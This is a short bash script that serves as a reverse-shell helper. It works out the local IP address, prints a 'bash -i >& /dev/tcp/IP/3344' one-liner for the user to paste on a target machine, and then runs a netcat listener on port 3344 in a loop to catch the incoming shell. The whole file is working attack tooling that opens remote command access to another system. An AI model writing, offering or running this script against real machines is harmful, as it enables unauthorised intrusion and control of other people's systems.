#!/bin/bash

ip=$(ping -c 1 255.255.255.255 | grep "bytes from" | cut -f4 -d " " | sed '$s/.$//')

echo ""
echo "" 

echo "Copy the following command:"

echo ""

echo "bash -i >& /dev/tcp/"$ip"/3344 0>&1 && nohup & exit"

echo ""
echo ""

echo "Paste the command here and hit Enter:"
until $(nc -l 3344 >&2 && echo "stuff"); do echo "## Restarting netcat connection ##" >&2; sleep 1; done
